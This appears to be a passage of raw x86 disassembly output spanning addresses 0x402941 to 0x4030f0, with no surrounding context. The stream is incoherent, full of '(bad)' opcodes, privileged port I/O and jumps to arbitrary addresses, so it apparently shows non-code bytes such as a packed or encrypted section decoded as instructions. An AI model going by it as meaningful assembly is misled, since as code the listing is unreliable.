  402941:	adc    BYTE PTR [esi-0xf33061e],dl
  402947:	cli    
  402948:	xor    BYTE PTR [esi-0x4f],ah
  40294b:	ss jbe 0x4028d8
  40294e:	dec    ebx
  40294f:	inc    eax
  402950:	adc    ch,BYTE PTR fs:[edx+edi*2+0x5d3e75e8]
  402958:	mov    es,edi
  40295a:	and    eax,0x274af50d
  40295f:	stos   BYTE PTR es:[edi],al
  402960:	popf   
  402961:	jmp    0x40291b
  402963:	(bad)  
  402964:	loop   0x402996
  402966:	lahf   
  402967:	sbb    esp,edx
  402969:	xor    DWORD PTR [ebx-0x6a5360ff],esp
  40296f:	dec    edi
  402970:	cli    
  402971:	sahf   
  402972:	jmp    0xf252:0x5ad2
  402978:	xrelease mov DWORD PTR [ecx],0x8bfcf513
  40297f:	(bad)  [edi-0x68]
  402982:	repnz and ah,BYTE PTR [ecx]
  402985:	cmp    esi,edx
  402987:	stos   BYTE PTR es:[edi],al
  402988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402989:	mov    al,0xfd
  40298b:	sar    DWORD PTR ds:0xc241d5ce,1
  402991:	mov    bh,0x70
  402993:	out    0xc0,eax
  402995:	add    dh,dh
  402997:	rol    DWORD PTR [eax-0x5e],0x5c
  40299b:	push   ebp
  40299c:	test   al,0x2a
  40299e:	aas    
  40299f:	pop    ebp
  4029a0:	adc    ebp,ebp
  4029a2:	inc    edi
  4029a3:	push   esp
  4029a4:	lods   al,BYTE PTR ds:[esi]
  4029a5:	xchg   DWORD PTR ds:0xeb78266f,ebp
  4029ab:	xchg   esi,eax
  4029ac:	push   eax
  4029ad:	add    edx,eax
  4029af:	jno    0x4029d5
  4029b1:	dec    ebx
  4029b2:	outs   dx,BYTE PTR ds:[esi]
  4029b3:	inc    esi
  4029b4:	mov    ?,WORD PTR [ecx-0x74]
  4029b7:	stc    
  4029b8:	mov    bh,0x45
  4029ba:	mov    WORD PTR [eax+edx*4-0x100a5a6],ds
  4029c1:	outs   dx,DWORD PTR ds:[esi]
  4029c2:	adc    dh,BYTE PTR [ecx-0x1be3585d]
  4029c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029c9:	loope  0x4029f1
  4029cb:	pop    es
  4029cc:	ucomiss xmm4,xmm3
  4029cf:	mov    al,ds:0x24c51fe1
  4029d4:	popf   
  4029d5:	dec    edi
  4029d6:	inc    ecx
  4029d7:	(bad)  
  4029d8:	fs les edi,FWORD PTR gs:[edx+0xc]
  4029dd:	test   eax,0x578cff6b
  4029e2:	test   BYTE PTR [ebp+0x62],dl
  4029e5:	and    al,0xe0
  4029e7:	mov    ds:0xa283d2de,al
  4029ec:	imul   ebp,DWORD PTR [ecx-0x5c],0x16ba8878
  4029f3:	lahf   
  4029f4:	sar    ah,1
  4029f6:	int    0x8c
  4029f8:	xchg   ebp,eax
  4029f9:	fsubr  DWORD PTR [esi+0x641ca9ea]
  4029ff:	push   ecx
  402a00:	icebp  
  402a01:	xor    eax,0x7be448a9
  402a06:	cmp    al,0xc6
  402a08:	push   edx
  402a09:	sbb    DWORD PTR [ebx-0x7d],ebx
  402a0c:	int3   
  402a0d:	ret    
  402a0e:	xchg   esi,eax
  402a0f:	ficomp WORD PTR [edx+ecx*2-0x99bb4d0]
  402a16:	stos   BYTE PTR es:[edi],al
  402a17:	stos   DWORD PTR es:[edi],eax
  402a18:	ficom  WORD PTR ds:0x60ff5605
  402a1e:	push   0xd9df700f
  402a23:	xchg   ebp,eax
  402a24:	mov    ch,0xc7
  402a26:	aas    
  402a27:	enter  0xd4f5,0xbd
  402a2b:	xchg   ecx,eax
  402a2c:	and    ah,cl
  402a2e:	fdivr  QWORD PTR [ecx]
  402a30:	ret    
  402a31:	cmp    eax,0x5e902c51
  402a36:	adc    eax,esp
  402a38:	mov    bl,0xdd
  402a3a:	adc    dh,BYTE PTR [esp+eax*4+0x71e35972]
  402a41:	adc    al,0xbd
  402a43:	stos   DWORD PTR es:[edi],eax
  402a44:	das    
  402a45:	cmp    eax,0x950c2f52
  402a4a:	jmp    0x3c35ced1
  402a4f:	adc    BYTE PTR [ecx-0x253c2ed7],bh
  402a55:	dec    esp
  402a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a57:	sbb    ch,cl
  402a59:	das    
  402a5a:	rcl    BYTE PTR fs:[edi-0x9ac2e1d],0x25
  402a62:	das    
  402a63:	xchg   edi,eax
  402a64:	and    al,0x5d
  402a66:	push   edx
  402a67:	in     eax,dx
  402a68:	push   edi
  402a69:	daa    
  402a6a:	mov    ds:0xf1214b6b,al
  402a6f:	imul   edx,DWORD PTR [ebx+0x7faaa6a1],0x4c
  402a76:	sbb    DWORD PTR [ebx+0x11],0xffffffad
  402a7a:	out    dx,eax
  402a7b:	dec    esi
  402a7c:	and    BYTE PTR [edx+0x2f4b9098],ah
  402a82:	mov    ebx,edi
  402a84:	(bad)  
  402a85:	mov    dl,0xa3
  402a87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a88:	sub    ebp,DWORD PTR [ebx-0x159f56ca]
  402a8e:	xor    eax,0xab88b743
  402a93:	sbb    edi,DWORD PTR [esi+0x68]
  402a96:	imul   eax,DWORD PTR [ecx-0x2e],0xffffffdd
  402a9a:	push   0x61c9265f
  402a9f:	fwait
  402aa0:	retf   
  402aa1:	repz inc dx
  402aa4:	bound  ebp,QWORD PTR ds:0x9368f194
  402aaa:	push   esp
  402aab:	loop   0x402a8d
  402aad:	arpl   WORD PTR [ebx*2-0x40cbb0ab],si
  402ab4:	mov    esp,0x8fe378ec
  402ab9:	mov    bh,0xec
  402abb:	dec    edx
  402abc:	adc    eax,0xbeb0f330
  402ac1:	or     al,0x3e
  402ac3:	push   edi
  402ac4:	sub    eax,0x469747ea
  402ac9:	xlat   BYTE PTR ds:[ebx]
  402aca:	mov    al,ds:0x1935c39c
  402acf:	lds    edi,FWORD PTR [ebp+esi*4+0x3b5a16c1]
  402ad6:	cdq    
  402ad7:	xor    BYTE PTR [edx+0x4e73a856],dh
  402add:	lods   al,BYTE PTR ds:[esi]
  402ade:	pop    ss
  402adf:	js     0x402a88
  402ae1:	sbb    esi,DWORD PTR [ebx]
  402ae3:	pop    ebp
  402ae4:	inc    edi
  402ae5:	arpl   WORD PTR [eax],bp
  402ae7:	mov    bh,0xed
  402ae9:	add    al,0x63
  402aeb:	shr    BYTE PTR [edi],1
  402aed:	xor    al,0x35
  402aef:	rcr    DWORD PTR [ebp+edx*4-0x59],1
  402af3:	jnp    0x402b50
  402af5:	retf   
  402af6:	in     al,0xff
  402af8:	jne    0x402b52
  402afa:	in     eax,0x22
  402afc:	and    al,0xa4
  402afe:	jmp    0x769f:0xc4daa700
  402b05:	out    dx,eax
  402b06:	shl    DWORD PTR [edi-0x73204a41],1
  402b0c:	adc    eax,0xac0a946d
  402b11:	iret   
  402b12:	cmp    BYTE PTR [eax+0x24],ah
  402b15:	push   0x6b
  402b17:	shl    DWORD PTR [ecx+0x72],1
  402b1a:	pop    es
  402b1b:	icebp  
  402b1c:	mov    edx,0x5c51ee06
  402b21:	mov    al,dh
  402b23:	push   ebx
  402b24:	loop   0x402b76
  402b26:	inc    eax
  402b27:	add    cl,BYTE PTR [esi-0x7b]
  402b2a:	arpl   WORD PTR [ebp-0x36835401],sp
  402b30:	shr    BYTE PTR [edx+0x8f5600e],1
  402b36:	jns    0x402b91
  402b38:	inc    DWORD PTR [edx]
  402b3a:	pop    DWORD PTR [edx]
  402b3c:	inc    ebp
  402b3d:	dec    ecx
  402b3e:	sbb    esp,edx
  402b40:	xor    eax,DWORD PTR ds:0xfbe41d53
  402b46:	and    DWORD PTR [eax],ecx
  402b48:	and    al,0x85
  402b4a:	jns    0x402b50
  402b4c:	xlat   BYTE PTR ds:[ebx]
  402b4d:	xchg   edi,eax
  402b4e:	scas   al,BYTE PTR es:[edi]
  402b4f:	adc    eax,0xef1ec368
  402b54:	pop    ecx
  402b55:	je     0x402af5
  402b57:	cmp    BYTE PTR [esp+ecx*1-0x44],0xef
  402b5c:	hlt    
  402b5d:	ror    DWORD PTR [edx],1
  402b5f:	sub    BYTE PTR [ebp-0x4e],dl
  402b62:	add    al,0xd4
  402b64:	inc    esp
  402b65:	mov    ds:0x8af24c1c,al
  402b6a:	sbb    DWORD PTR [ecx],edi
  402b6c:	dec    esi
  402b6d:	jb     0x402b30
  402b6f:	inc    edx
  402b70:	or     al,dh
  402b72:	fisub  WORD PTR [eax+eiz*2+0x36]
  402b76:	inc    ecx
  402b77:	mov    al,ds:0x62981b60
  402b7c:	push   es
  402b7d:	lea    ebx,[ebx-0x46]
  402b80:	imul   dx,WORD PTR ds:0xc07de0aa,0x1b
  402b88:	ja     0x402b5c
  402b8a:	and    eax,0x4a8b6dec
  402b8f:	cdq    
  402b90:	mov    cl,0x80
  402b92:	mov    ds:0x5eb28daf,al
  402b97:	cmp    edx,ebx
  402b99:	ss or  eax,0x460e7929
  402b9f:	cmp    eax,0xd54db543
  402ba4:	mov    ds:0xee6b21df,al
  402ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402baa:	je     0x402b5a
  402bac:	sub    DWORD PTR ds:0xa46435e8,esp
  402bb2:	sub    DWORD PTR [eax+ecx*1-0x5393d684],esp
  402bb9:	rcr    BYTE PTR [ebp-0x1a4d6fe8],0x67
  402bc0:	ds out 0x37,al
  402bc3:	or     ch,BYTE PTR [esi]
  402bc5:	ins    BYTE PTR es:[edi],dx
  402bc6:	stos   BYTE PTR es:[edi],al
  402bc7:	and    BYTE PTR [eax+0xc],cl
  402bca:	or     eax,DWORD PTR [eax]
  402bcc:	aad    0x7b
  402bce:	push   ss
  402bcf:	inc    ebp
  402bd0:	test   al,0xf0
  402bd2:	mov    esp,0xb66d5e3e
  402bd7:	in     al,0x8f
  402bd9:	inc    ebx
  402bda:	mov    ds:0x527d32de,al
  402bdf:	ja     0x402b66
  402be1:	lods   al,BYTE PTR ds:[esi]
  402be2:	out    0x10,eax
  402be4:	stc    
  402be5:	xchg   ah,bh
  402be7:	enter  0x7e34,0x8
  402beb:	xchg   esp,eax
  402bec:	mov    ebx,0x2fc75dac
  402bf1:	(bad)  
  402bf2:	clc    
  402bf3:	pop    esi
  402bf4:	and    bh,ch
  402bf6:	jns    0x402c08
  402bf8:	pop    ebx
  402bf9:	jo     0x402bff
  402bfb:	inc    ch
  402bfd:	inc    ebp
  402bfe:	call   FWORD PTR [edi]
  402c00:	xchg   edx,eax
  402c01:	(bad)  
  402c03:	pop    esi
  402c04:	mov    dh,0x38
  402c06:	or     ebp,DWORD PTR [ebp+ecx*2-0x55dc8ddf]
  402c0d:	inc    esi
  402c0e:	jo     0x402b9f
  402c10:	mov    dh,0xb2
  402c12:	push   edx
  402c13:	and    eax,0x5ef07481
  402c18:	(bad)  
  402c19:	call   0xbe87:0x4288c6a7
  402c20:	das    
  402c21:	hlt    
  402c22:	aad    0xfc
  402c24:	xchg   BYTE PTR [si+0x4ec8],ch
  402c29:	clc    
  402c2a:	retf   0x84f8
  402c2d:	sub    BYTE PTR [edi-0x20],0x3a
  402c31:	bound  ebp,QWORD PTR [eax]
  402c33:	fisub  DWORD PTR [edi+0x7b30eada]
  402c39:	out    0xc5,al
  402c3b:	inc    BYTE PTR [eax]
  402c3d:	cmp    dh,bh
  402c3f:	gs mov bh,0x65
  402c42:	arpl   WORD PTR [ebp+0x13e9f992],cx
  402c48:	test   al,0xaf
  402c4a:	ins    BYTE PTR es:[edi],dx
  402c4b:	jp     0x402bfe
  402c4d:	inc    edx
  402c4e:	push   ecx
  402c4f:	test   DWORD PTR [edx+0x33],ebx
  402c52:	mov    dl,dh
  402c54:	add    eax,0xca99e102
  402c59:	mov    DWORD PTR [eax],esi
  402c5b:	bnd jge 0x402c37
  402c5e:	aaa    
  402c5f:	shl    BYTE PTR [edi+ecx*1+0x1aa3fca3],cl
  402c66:	repnz pop ds
  402c68:	sub    ebx,DWORD PTR [ecx+0x55]
  402c6b:	inc    ebp
  402c6c:	pop    edi
  402c6d:	stos   DWORD PTR es:[edi],eax
  402c6e:	lahf   
  402c6f:	mov    BYTE PTR [esi+eiz*1],bh
  402c72:	ins    BYTE PTR es:[edi],dx
  402c73:	and    DWORD PTR [esi+0x26],ebp
  402c76:	aad    0x9
  402c78:	loopne 0x402c85
  402c7a:	xchg   DWORD PTR [esi-0x24d6e95e],edx
  402c80:	pop    es
  402c81:	xlat   BYTE PTR ds:[ebx]
  402c82:	jmp    0x1312583f
  402c87:	push   es
  402c88:	adc    eax,0x4aff2c0a
  402c8d:	push   cs
  402c8e:	or     al,0xb
  402c90:	adc    eax,0x67866128
  402c95:	stos   DWORD PTR es:[edi],eax
  402c96:	fsub   DWORD PTR [ebx+0xa20c117]
  402c9c:	mov    WORD PTR [esi+0x474b12ea],fs
  402ca2:	sub    bl,BYTE PTR [esi-0x6bc38f06]
  402ca8:	cmc    
  402ca9:	es stc 
  402cab:	hlt    
  402cac:	mov    WORD PTR [ebx+0x56],ss
  402caf:	enter  0x22b8,0x98
  402cb3:	inc    ebx
  402cb4:	adc    eax,edx
  402cb6:	sbb    eax,0x892d3100
  402cbb:	arpl   WORD PTR [esi],cx
  402cbd:	(bad)  
  402cbe:	sub    al,0xb5
  402cc0:	arpl   WORD PTR [edx+0x3dea524f],cx
  402cc6:	gs call 0x9937:0xf1383f32
  402cce:	sub    DWORD PTR [ebx],0x27
  402cd1:	fcmove st,st(7)
  402cd3:	test   al,0xdd
  402cd5:	out    0x67,al
  402cd7:	(bad)  
  402cd8:	loop   0x402c6d
  402cda:	(bad)  
  402cdb:	ja     0x402cf6
  402cdd:	mul    ebp
  402cdf:	and    DWORD PTR [edx+0x6e794db7],eax
  402ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ce6:	inc    ebp
  402ce7:	popa   
  402ce8:	or     cl,BYTE PTR [edx+0x41]
  402ceb:	dec    edx
  402cec:	imul   edx,DWORD PTR [edi-0x38],0x7e77ad9d
  402cf3:	pop    edi
  402cf4:	push   edx
  402cf5:	mov    dl,BYTE PTR [edi-0x3b]
  402cf8:	imul   ebx,DWORD PTR [esi+0x2414512c],0x27e117c7
  402d02:	add    eax,0xc7b75d03
  402d07:	cld    
  402d08:	pop    ebp
  402d09:	lea    ecx,ds:0x7c388f0a
  402d0f:	rcl    DWORD PTR [ecx-0x78c609b3],cl
  402d15:	and    bl,BYTE PTR [ebp+0x79]
  402d18:	fabs   
  402d1a:	es push esp
  402d1c:	test   DWORD PTR [ecx+0x3d],esp
  402d1f:	mov    ch,0x76
  402d21:	ret    
  402d22:	test   DWORD PTR ds:0xb2ce7442,eax
  402d28:	repnz add ebp,ecx
  402d2b:	cmp    eax,DWORD PTR [ebx-0x2c]
  402d2e:	dec    ecx
  402d2f:	sbb    DWORD PTR cs:[edx+esi*8-0x7f],esp
  402d34:	dec    ebp
  402d35:	and    al,0xf7
  402d37:	adc    ebp,DWORD PTR [edi]
  402d39:	iret   
  402d3a:	inc    esi
  402d3b:	push   ss
  402d3c:	pop    esp
  402d3d:	xlat   BYTE PTR ds:[ebx]
  402d3e:	inc    edx
  402d3f:	mov    esi,0x8f6fbdd
  402d44:	dec    ebp
  402d45:	jmp    0x402d78
  402d47:	div    BYTE PTR [ecx-0x257359c4]
  402d4d:	sbb    bh,bl
  402d4f:	mov    cl,0xd7
  402d51:	cmc    
  402d52:	(bad)  
  402d53:	sub    DWORD PTR ds:0x954bad17,edi
  402d59:	mov    ch,0x8
  402d5b:	in     eax,0xb3
  402d5d:	xor    BYTE PTR [esi+0x4d],dh
  402d60:	and    eax,0xc8b0dbe9
  402d65:	seta   BYTE PTR [edi]
  402d68:	xchg   edx,eax
  402d69:	repnz mov dl,0xca
  402d6c:	xor    al,0xcd
  402d6e:	cmp    bl,BYTE PTR [eax-0x4c817a7]
  402d74:	ret    0x326a
  402d77:	and    ch,BYTE PTR [edi]
  402d79:	popa   
  402d7a:	jle    0x402dd3
  402d7c:	cwde   
  402d7d:	push   es
  402d7e:	pop    esp
  402d7f:	pop    esp
  402d80:	fcom   QWORD PTR [ebx+0x10762589]
  402d86:	retf   0x58c9
  402d89:	out    0x77,al
  402d8b:	and    BYTE PTR [edi],al
  402d8d:	add    ah,BYTE PTR [edi-0x79782bdb]
  402d93:	adc    BYTE PTR [esi-0x59989ef1],bh
  402d99:	cli    
  402d9a:	push   0xfb780395
  402d9f:	mov    eax,ds:0xb09c495e
  402da4:	mov    cl,0x68
  402da6:	and    esp,eax
  402da8:	test   eax,0xeb873ca3
  402dad:	in     al,0xa6
  402daf:	add    BYTE PTR [edi+0x56],al
  402db2:	cmp    BYTE PTR [eax+edx*1],dh
  402db5:	mov    ?,WORD PTR [edi+ebx*4]
  402db8:	jno    0x402e1f
  402dba:	lahf   
  402dbb:	popf   
  402dbc:	cs cli 
  402dbe:	bound  ebp,QWORD PTR [ecx+0x6b]
  402dc1:	xor    DWORD PTR [ebx+ebx*8],edi
  402dc4:	xor    al,0x4e
  402dc6:	xchg   ecx,eax
  402dc7:	imul   ecx,DWORD PTR [esi+0x4],0x57
  402dcb:	push   ebp
  402dcc:	xor    dl,bh
  402dce:	enter  0x252c,0x8a
  402dd2:	nop
  402dd3:	aad    0xe2
  402dd5:	inc    edx
  402dd6:	fadd   st,st(6)
  402dd8:	jns    0x402da8
  402dda:	sahf   
  402ddb:	into   
  402ddc:	adc    al,0x72
  402dde:	push   cs
  402ddf:	pop    ecx
  402de0:	push   ds
  402de1:	mov    ebp,0xb332cba
  402de6:	push   cs
  402de7:	push   ebx
  402de8:	dec    eax
  402de9:	mov    ebx,0xda690281
  402dee:	stos   BYTE PTR es:[edi],al
  402def:	pop    esp
  402df0:	inc    edx
  402df1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402df2:	retf   0xfefe
  402df5:	aaa    
  402df6:	xor    dh,BYTE PTR [edi-0x8fb5e51]
  402dfc:	fldcw  WORD PTR [ecx]
  402dfe:	fucomi st,st(1)
  402e00:	ins    DWORD PTR es:[edi],dx
  402e01:	inc    ebx
  402e02:	adc    ecx,esi
  402e04:	inc    ebx
  402e05:	(bad)  
  402e06:	cdq    
  402e07:	bswap  edx
  402e09:	aam    0x4d
  402e0b:	xchg   edx,eax
  402e0c:	jnp    0x402e68
  402e0e:	inc    eax
  402e0f:	inc    ebp
  402e10:	jle    0x402df5
  402e12:	stos   DWORD PTR es:[edi],eax
  402e13:	adc    eax,DWORD PTR [ecx+0x4043af59]
  402e19:	ins    BYTE PTR es:[edi],dx
  402e1a:	cmp    BYTE PTR [eax-0x15453b31],dl
  402e20:	cmp    eax,0xd1948b2a
  402e25:	and    al,0x99
  402e27:	mov    ah,0x5b
  402e29:	ins    DWORD PTR es:[edi],dx
  402e2a:	(bad)  
  402e2b:	sub    eax,0x59610634
  402e30:	rol    BYTE PTR [edi],1
  402e32:	ret    
  402e33:	cld    
  402e34:	mov    bh,0xf7
  402e36:	retf   0x163c
  402e39:	or     al,0xe3
  402e3b:	mov    edi,edi
  402e3d:	push   esp
  402e3e:	mov    edi,0x9b2def91
  402e43:	imul   ecx,DWORD PTR [esi+edi*4-0x44],0xa7dd0f98
  402e4b:	sti    
  402e4c:	fstp   DWORD PTR ss:[edx+0x39]
  402e50:	mov    ah,0xbc
  402e52:	test   eax,0x7a8dc136
  402e57:	mov    ds:0xe35df9a6,al
  402e5c:	jne    0x402dfb
  402e5e:	ss dec esp
  402e60:	ja     0x402ea9
  402e62:	je     0x402ec6
  402e64:	cmp    ebx,DWORD PTR [ecx]
  402e66:	xchg   esi,eax
  402e67:	sbb    al,0xd2
  402e69:	pusha  
  402e6a:	out    0x5b,eax
  402e6c:	mov    ah,0x32
  402e6e:	imul   ebp,DWORD PTR [edx-0x31],0x9728dc23
  402e75:	sbb    al,0x66
  402e77:	daa    
  402e78:	inc    edi
  402e79:	imul   ebx,DWORD PTR [eax+edx*2],0x3e8b3efa
  402e80:	sbb    ecx,eax
  402e82:	mov    ecx,0xb464a1b2
  402e87:	fadd   DWORD PTR [ecx]
  402e89:	cdq    
  402e8a:	stos   DWORD PTR es:[edi],eax
  402e8b:	cs (bad) 
  402e8d:	dec    DWORD PTR [esi+0x4f49eee1]
  402e93:	ret    0xa583
  402e96:	inc    ebp
  402e97:	jbe    0x402ed3
  402e99:	aam    0xfc
  402e9b:	cmp    al,0xca
  402e9d:	dec    ebp
  402e9e:	pop    ebx
  402e9f:	into   
  402ea0:	mov    edi,0x1ffd3508
  402ea5:	inc    esi
  402ea6:	stos   BYTE PTR es:[edi],al
  402ea7:	cmp    bl,BYTE PTR [esi]
  402ea9:	punpckldq mm0,DWORD PTR [edi+0x18447750]
  402eb0:	je     0x402ef7
  402eb2:	std    
  402eb3:	test   ebp,ebp
  402eb5:	in     al,dx
  402eb6:	jbe    0x402f15
  402eb8:	xchg   BYTE PTR [esi],bl
  402eba:	or     DWORD PTR [ebx+0x65],edx
  402ebd:	xor    eax,0xe3e1f275
  402ec2:	xor    cl,dh
  402ec4:	loope  0x402e75
  402ec6:	sub    bh,BYTE PTR [esp+edi*8-0x33ce39eb]
  402ecd:	dec    eax
  402ece:	mov    ch,0xdf
  402ed0:	(bad)  
  402ed1:	in     al,0xb6
  402ed3:	popa   
  402ed4:	mov    bh,0xc3
  402ed6:	rol    BYTE PTR [eax],cl
  402ed8:	fst    QWORD PTR [edx]
  402eda:	pop    ds
  402edb:	pop    eax
  402edc:	es mov ebp,0x451d3354
  402ee2:	pop    edi
  402ee3:	(bad)  
  402ee4:	les    edi,FWORD PTR [edi-0x1ed52342]
  402eea:	sahf   
  402eeb:	lahf   
  402eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402eed:	mov    eax,0xae75d8e8
  402ef2:	sahf   
  402ef3:	loop   0x402f60
  402ef5:	or     DWORD PTR [ecx],edx
  402ef7:	mov    WORD PTR [ebx+0x0],es
  402efa:	mov    ss,WORD PTR [edi]
  402efc:	bound  edi,QWORD PTR [eax+0x31]
  402eff:	sbb    al,0x21
  402f01:	jns    0x402f3c
  402f03:	mov    esi,0xc22105b3
  402f08:	xor    DWORD PTR [ebx],eax
  402f0a:	int    0x17
  402f0c:	test   BYTE PTR [ecx],ah
  402f0e:	sub    esp,eax
  402f10:	test   al,0x85
  402f12:	lods   eax,DWORD PTR ds:[esi]
  402f13:	pop    es
  402f14:	out    0x61,al
  402f16:	mov    edx,0xc735fffd
  402f1b:	pop    edx
  402f1c:	jmp    0x402f5c
  402f1e:	repz test edx,0x860ce779
  402f25:	aad    0x47
  402f27:	push   es
  402f28:	scas   eax,DWORD PTR es:[edi]
  402f29:	and    cl,BYTE PTR [edi-0x32d5343]
  402f2f:	pop    esp
  402f30:	jmp    0x51fe6ec0
  402f35:	mov    bl,0x4e
  402f37:	ins    BYTE PTR es:[edi],dx
  402f38:	(bad)  
  402f39:	inc    edx
  402f3a:	sub    DWORD PTR [ebp+0x77],edx
  402f3d:	adc    eax,0x5e1cd26d
  402f42:	push   0xffffffae
  402f44:	jae    0x402f7b
  402f46:	ins    DWORD PTR es:[edi],dx
  402f47:	and    BYTE PTR [edx-0x55],dl
  402f4a:	cs das 
  402f4c:	repz mov ds:0x1d079b66,al
  402f52:	cmp    BYTE PTR [edi],dl
  402f54:	sbb    DWORD PTR [esi-0x1e],edx
  402f57:	inc    ecx
  402f58:	lahf   
  402f59:	xor    ah,bh
  402f5b:	addr16 push ebp
  402f5d:	clc    
  402f5e:	and    BYTE PTR [ecx+0x1b],bl
  402f61:	imul   esp,ebp,0x61
  402f64:	addr16 xor eax,0xe11fe44d
  402f6a:	test   eax,0xc907c9f
  402f6f:	inc    esp
  402f70:	jnp    0x402f57
  402f72:	cmp    BYTE PTR [ecx],bl
  402f74:	pop    esi
  402f75:	aam    0xd9
  402f77:	xor    BYTE PTR [edx-0x22],ah
  402f7a:	pusha  
  402f7b:	fcom   st(3)
  402f7d:	cmp    al,0x40
  402f7f:	mov    ch,0x61
  402f81:	mov    BYTE PTR [edx-0x39],bh
  402f84:	clc    
  402f85:	jle    0x402f16
  402f87:	ret    
  402f88:	lods   al,BYTE PTR ds:[esi]
  402f89:	add    DWORD PTR [esi],ebp
  402f8b:	mov    dl,0xb
  402f8d:	test   DWORD PTR [ebp+eiz*2-0x31b2ef7c],0xeaedffaf
  402f98:	fdiv   QWORD PTR [eax+0x7c94257f]
  402f9e:	mov    eax,ds:0xac46d371
  402fa3:	xchg   BYTE PTR [edx+edi*4-0x40691bd4],dh
  402faa:	(bad)  
  402fab:	rcr    bl,0x7e
  402fae:	sti    
  402faf:	loope  0x402fc5
  402fb1:	imul   eax,edi,0xe
  402fb4:	pop    edi
  402fb5:	jae    0x402f88
  402fb7:	mov    ds:0xfd252086,eax
  402fbc:	cmp    ebx,ebx
  402fbe:	pop    eax
  402fbf:	repz xor BYTE PTR [ebp-0x7187ca5],dh
  402fc6:	scas   ax,WORD PTR es:[edi]
  402fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc9:	stc    
  402fca:	scas   al,BYTE PTR es:[edi]
  402fcb:	aad    0x1d
  402fcd:	inc    eax
  402fce:	gs xchg ebp,eax
  402fd0:	repnz or DWORD PTR [edx],esp
  402fd3:	xor    eax,0x2e51f00b
  402fd8:	add    BYTE PTR [edx+eax*4],ah
  402fdb:	enter  0xd521,0xfa
  402fdf:	mov    ah,0xd8
  402fe1:	mov    ecx,0xe32496d8
  402fe6:	adc    ecx,edx
  402fe8:	or     ah,dh
  402fea:	aaa    
  402feb:	(bad)  
  402fec:	out    dx,eax
  402fed:	jge    0x403011
  402fef:	and    al,0x9c
  402ff1:	xchg   ebp,eax
  402ff2:	pop    ds
  402ff3:	pop    esi
  402ff4:	arpl   WORD PTR [ebx+0x69],bp
  402ff7:	(bad)  
  402ff9:	xor    ebp,DWORD PTR [ebx]
  402ffb:	dec    esp
  402ffc:	icebp  
  402ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ffe:	cmp    al,0x4
  403000:	sti    
  403001:	test   al,0x3a
  403003:	push   edi
  403004:	popf   
  403005:	test   bh,cl
  403007:	and    BYTE PTR [edx],bl
  403009:	ds jmp 0x189b771d
  40300f:	sar    BYTE PTR [ebx],1
  403011:	scas   al,BYTE PTR es:[edi]
  403012:	pop    esp
  403013:	xor    eax,DWORD PTR [edi-0x70]
  403016:	iret   
  403017:	addr16 mov bh,0xbe
  40301a:	pop    es
  40301b:	int3   
  40301c:	jmp    0x8d331d06
  403021:	pop    esi
  403022:	mov    esi,0x576c472a
  403027:	mov    ch,BYTE PTR [esi+0x70ef6f75]
  40302d:	xchg   ebx,eax
  40302e:	add    DWORD PTR [edi-0x5d965fb2],ebx
  403034:	div    BYTE PTR [esi]
  403036:	mov    DWORD PTR [edx-0x73f076cd],edi
  40303c:	outs   dx,DWORD PTR ds:[esi]
  40303d:	popf   
  40303e:	mov    dl,al
  403040:	jmp    0x7f703b75
  403045:	mov    edi,0x64b2cb0b
  40304a:	push   es
  40304b:	les    esi,FWORD PTR [ecx+0x199260e5]
  403051:	out    0x6,eax
  403053:	push   ebp
  403054:	shl    BYTE PTR [edx-0x2c],cl
  403057:	inc    ecx
  403058:	xor    BYTE PTR [edx],0xc
  40305b:	inc    esi
  40305c:	pop    ss
  40305d:	mov    cl,0xbc
  40305f:	icebp  
  403060:	lock ret 0xae24
  403064:	pop    es
  403065:	xor    al,0x3
  403067:	leave  
  403068:	(bad)  [ebp+edi*2+0x61]
  40306c:	imul   esi,ebx,0xffffffd6
  40306f:	jae    0x4030d5
  403071:	dec    esp
  403072:	jmp    DWORD PTR [esp+eiz*4-0x1f]
  403076:	ds mov dl,0x19
  403079:	dec    ebx
  40307a:	pop    eax
  40307b:	jmp    0x4030c2
  40307d:	bound  edi,QWORD PTR [edi+esi*8-0x31e8063d]
  403084:	mov    ebx,0xffac0388
  403089:	add    eax,0x56c494c9
  40308e:	aaa    
  40308f:	popf   
  403090:	push   cs
  403091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403092:	or     eax,DWORD PTR [ecx]
  403094:	inc    ecx
  403095:	mov    al,0x9e
  403097:	or     BYTE PTR [edi],dl
  403099:	jbe    0x403073
  40309b:	mov    al,ds:0xd6c76b48
  4030a0:	neg    esp
  4030a2:	push   cs
  4030a3:	push   ecx
  4030a4:	mov    DWORD PTR [ebx],edx
  4030a6:	popf   
  4030a7:	sbb    BYTE PTR [eax],bh
  4030a9:	shl    dl,1
  4030ab:	ror    DWORD PTR [ecx],0x6d
  4030ae:	inc    esp
  4030af:	jl     0x40307c
  4030b1:	pop    ds
  4030b2:	add    al,0xb8
  4030b4:	fdiv   DWORD PTR [edx+0x58e0256d]
  4030ba:	pop    esp
  4030bb:	retf   
  4030bc:	jns    0x403040
  4030be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030bf:	xor    BYTE PTR ds:0x460d2252,cl
  4030c5:	adc    dh,dl
  4030c7:	loopne 0x403108
  4030c9:	sbb    al,bh
  4030cb:	add    DWORD PTR [esi+eax*1],edi
  4030ce:	pusha  
  4030cf:	pop    es
  4030d0:	mov    ebp,0xc8024d74
  4030d5:	push   0x46350823
  4030da:	mov    bh,0xe6
  4030dc:	and    al,0x71
  4030de:	ins    BYTE PTR es:[edi],dx
  4030df:	stos   DWORD PTR es:[edi],eax
  4030e0:	adc    al,0xb3
  4030e2:	jecxz  0x403151
  4030e4:	loopne 0x403118
  4030e6:	test   bl,cl
  4030e8:	xor    DWORD PTR [ebx+0x3af3a9b8],esp
  4030ee:	out    dx,al
  4030ef:	xchg   edx,eax
  4030f0:	imul   esi,edx,0x68e286f1
